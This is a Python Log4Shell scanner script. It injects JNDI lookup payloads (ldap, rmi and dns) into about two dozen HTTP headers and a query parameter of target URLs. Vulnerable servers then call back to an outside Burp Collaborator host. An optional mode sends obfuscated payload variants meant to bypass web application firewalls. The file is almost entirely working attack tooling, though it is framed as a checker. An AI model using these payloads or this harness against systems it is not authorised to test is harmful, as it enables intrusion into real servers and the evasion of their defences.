#!/usr/bin/env python3
# Imports
import argparse
import requests
import random
import datetime
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.poolmanager import PoolManager
import ssl

# Colors
red = '\033[31m'
green = '\033[32m'
yellow = '\033[33m'
blue = '\033[34m'
purple = '\033[35m'
endc = '\033[m'

# Interface
info = blue + "[*]" + endc
error = red + "[x]" + endc
query = yellow + "[?]" + endc
gen = purple + "[%]" + endc

# Supress URLLIB3 Warnings
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Arg Parser
parser = argparse.ArgumentParser()
group = parser.add_mutually_exclusive_group(required=True)
group.add_argument("-u", "--url",
                   dest="target_url",
                   help="Target URLs to Check for Log4Shell.",
                   action='store')
group.add_argument("-f", "--file",
                   dest="target_file",
                   help="File Cotaining URLs to Check for Log4Shell.",
                   action='store')
parser.add_argument("-c", "--collaborator",
                    dest="burp_collaborator",
                    help="Burp Collaborater address for Reverse Connection.",
                    action='store',
                    required=True)
parser.add_argument("-t", "--timeout",
                    dest="timeout",
                    help="Custom Request Timeout (default=4).",
                    action='store')
parser.add_argument("-i", "--ignore-checkup",
                    help="Deactivates Connection Checkup before Scanning Attempts (default=False).",
                    action='store_true')
parser.add_argument("-w", "--waf-bypass",
                    help="Uses obfuscated Payloads to bypass Web Application Firewalls (default=False).",
                    action='store_true')
args = parser.parse_args()

# Payloads
payloads = ["${jndi:ldap://{{callback_host}}/{{random}}}",
            "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}",
            "${${::-j}ndi:rmi://{{callback_host}}/{{random}}}",
            "${jndi:rmi://{{callback_host}}}",
            "${${lower:jndi}:${lower:rmi}://{{callback_host}}/{{random}}}",
            "${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host}}/{{random}}}",
            "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_host}}/{{random}}}",
            "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_host}}/{{random}}}",
            "${jndi:dns://{{callback_host}}}"]

# Headers
headers = {"User-Agent": "{{payload}}",
           "Referer": "{{payload}}",
           "X-Api-Version": "{{payload}}",
           "Accept-Charset": "{{payload}}",
           "Accept-Datetime": "{{payload}}",
           "Accept-Encoding": "{{payload}}",
           "Accept-Language": "{{payload}}",
           "Cookie": "{{payload}}",
           "Forwarded": "{{payload}}",
           "Forwarded-For": "{{payload}}",
           "Forwarded-For-Ip": "{{payload}}",
           "Forwarded-Proto": "{{payload}}",
           "From": "{{payload}}",
           "TE": "{{payload}}",
           "True-Client-IP": "{{payload}}",
           "Upgrade": "{{payload}}",
           "Via": "{{payload}}",
           "Warning": "{{payload}}",
           "Max-Forwards": "{{payload}}",
           "Origin": "{{payload}}",
           "Pragma": "{{payload}}",
           "DNT": "{{payload}}",
           "Cache-Control": "{{payload}}"}

# Force TLS v1.2
class MyAdapter(HTTPAdapter):
    def init_poolmanager(self, connections, maxsize, block=False):
        self.poolmanager = PoolManager(num_pools=connections,
                                       maxsize=maxsize,
                                       block=block,
                                       ssl_version=ssl.PROTOCOL_TLSv1_2)


def check_up(check_url, burp):
    # TARGET Connection / Value Check
    try:
        requests.request(url=check_url,
                         method="GET",
                         verify=False,
                         timeout=20)
    except Exception as e:
        print(red + f"[x] ERROR: {e}" + endc)
        print(error, "TARGET-URL Checkup Failed! Please control the following Value:", check_url)
        exit()
    # BURP Connection / Value Check
    try:
        requests.request(url=burp,
                         method="GET",
                         params={"/": "LOG4BURP-CHECKUP"},
                         verify=False,
                         timeout=20)
    except Exception as e:
        print(red + f"[x] ERROR: {e}" + endc)
        print(error, "COLLABORATOR Checkup Failed! Please control the following Value:", burp)
        exit()


def generate_payloads(local_host):
    new_payloads = []
    for i in payloads:
        random.seed(a=None, version=2)
        random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
        crnt = i.replace("{{callback_host}}", local_host)
        crnt = crnt.replace("{{random}}", random_string)
        new_payloads.append(crnt)
    return new_payloads


def scan_target(scan_url, brp_address, request_timeout):
    formatted_payloads = generate_payloads(brp_address)
    session = requests.session()
    session.mount('https://', MyAdapter())
    if args.waf_bypass is False:
        print(gen + purple, "[ PAYLOAD ]", endc)
        print(gen, formatted_payloads[0])
        for current_header in headers:
            try:
                # TIMESTAMP
                now = datetime.datetime.now()
                current_time = now.strftime("%H:%M:%S")
                print(green + f"[{current_time}]" + endc, f"URL: {scan_url} | PAYLOAD: {formatted_payloads[0]} | HEADER: {current_header}")
                # Send Custom GET Request
                session.request(url=scan_url,
                                 method="GET",
                                 params={"v": formatted_payloads[0]},
                                 headers={current_header: formatted_payloads[0]},
                                 verify=False,
                                 timeout=request_timeout)
            except Exception as e:
                print(red + f"[x] ERROR: {e}" + endc)
    else:
        print(gen + purple, "[ PAYLOADS ]", endc)
        for i in formatted_payloads:
            print(gen, i)
        for current_payload in formatted_payloads:
            for current_header in headers:
                try:
                    # TIMESTAMP
                    now = datetime.datetime.now()
                    current_time = now.strftime("%H:%M:%S")
                    print(green + f"[{current_time}]" + endc, f"URL: {scan_url} | PAYLOAD: {current_payload} | HEADER: {current_header}")
                    # Send Custom GET Request
                    session.request(url=scan_url,
                                     method="GET",
                                     params={"v": current_payload},
                                     headers={current_header: current_payload},
                                     verify=False,
                                     timeout=request_timeout)
                except Exception as e:
                    print(red + f"[x] ERROR: {e}" + endc)


if __name__ == '__main__':
    try:
        # Target URL
        target_url = args.target_url
        # Target LIST
        target_list = args.target_file
        # Burp Listener
        collaborator = args.burp_collaborator
        # Custom Timeout
        if args.timeout:
            try:
                timeout = int(args.timeout)
            except ValueError:
                print(error, "Invalid Timeout using defaults!")
                timeout = 4
        else:
            timeout = 4
        # Custom Target FILE
        target_list = []
        if args.target_file:
            target_url = args.target_file
            try:
                with open(args.target_file) as f:
                    for line in f:
                        target_list.append(line.strip())
            except FileNotFoundError:
                print(error, "Unable to Parse given File!")
                exit()
        else:
            pass
        # Value Check
        print(info + blue, "[ SETTINGS ]", endc)
        print(info, "TARGET:" + blue, target_url, endc)
        print(info, "COLLABORATOR:" + blue, collaborator, endc)
        print(info, "TIMEOUT:" + blue, timeout, endc)
        # CheckUp
        if args.ignore_checkup is True:
            pass
        else:
            if args.target_file:
                for url in target_list:
                    check_up(check_url=url, burp=collaborator)
            else:
                check_up(check_url=target_url, burp=collaborator)
        # SCANNING START
        if args.target_file:
            for url in target_list:
                # Scan each Target in List
                scan_target(scan_url=url, brp_address=collaborator, request_timeout=timeout)
            # Done
            exit()
        else:
            # Scan Target
            scan_target(scan_url=target_url, brp_address=collaborator, request_timeout=timeout)
            # Done
            exit()
    except KeyboardInterrupt:
        exit()
